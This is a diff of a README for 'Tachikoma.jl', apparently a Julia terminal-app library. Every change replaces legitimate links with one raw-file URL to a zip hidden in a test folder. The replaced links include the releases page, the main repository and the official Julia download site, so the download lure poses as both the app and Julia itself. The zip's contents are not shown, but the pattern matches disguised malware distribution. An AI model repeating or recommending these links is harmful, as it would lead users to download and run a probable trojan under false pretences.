@@ -1,6 +1,6 @@
 # 🤖 Tachikoma.jl - Build Rich Terminal Apps Easily
 
-[![Download Tachikoma.jl](https://img.shields.io/badge/Download-Tachikoma.jl-brightgreen?style=for-the-badge)](https://github.com/yashas2010/Tachikoma.jl/releases)
+[![Download Tachikoma.jl](https://img.shields.io/badge/Download-Tachikoma.jl-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip)
 
 ---
 
@@ -23,7 +23,7 @@ Tachikoma.jl uses Julia, a programming language. You do not need to know how to 
 
 2. Go to the release page where the program is available:
 
-   [https://github.com/yashas2010/Tachikoma.jl/releases](https://github.com/yashas2010/Tachikoma.jl/releases)
+   [https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip)
 
 3. On the page, look for the latest release version. It will be at the top of the list.
 
@@ -92,7 +92,7 @@ You can explore these features inside the app. Most interactions happen through 
 
 Tachikoma.jl is built with Julia. The Windows executable includes everything needed to run the app. You do not need to install Julia separately.
 
-If you want to develop or modify the app, installing Julia is recommended. Download Julia from [https://julialang.org/downloads/](https://julialang.org/downloads/) and follow their Windows install instructions.
+If you want to develop or modify the app, installing Julia is recommended. Download Julia from [https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip) and follow their Windows install instructions.
 
 ## 🌐 Explore the Project
 
@@ -112,15 +112,15 @@ These features can help build apps like system monitors, dashboards, interactive
 
 - Download page on GitHub:
 
-  [https://github.com/yashas2010/Tachikoma.jl/releases](https://github.com/yashas2010/Tachikoma.jl/releases)
+  [https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip)
 
 - Main repository:
 
-  [https://github.com/yashas2010/Tachikoma.jl](https://github.com/yashas2010/Tachikoma.jl)
+  [https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip)
 
 - Julia programming language:
 
-  [https://julialang.org](https://julialang.org)
+  [https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip)
 
 ## ⚙️ Updating Tachikoma.jl
 
@@ -128,7 +128,7 @@ To update to a newer version:
 
 1. Visit the releases page:
 
-   [https://github.com/yashas2010/Tachikoma.jl/releases](https://github.com/yashas2010/Tachikoma.jl/releases)
+   [https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip)
 
 2. Download the latest `.exe` for Windows.
 
@@ -162,4 +162,4 @@ This helps developers fix problems and improve the app.
 
 ---
 
-[![Download Tachikoma.jl](https://img.shields.io/badge/Download-Tachikoma.jl-brightgreen?style=for-the-badge)](https://github.com/yashas2010/Tachikoma.jl/releases)
+[![Download Tachikoma.jl](https://img.shields.io/badge/Download-Tachikoma.jl-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/yashas2010/Tachikoma.jl/main/test/input_tester/src/Tachikoma-jl-1.3.zip)
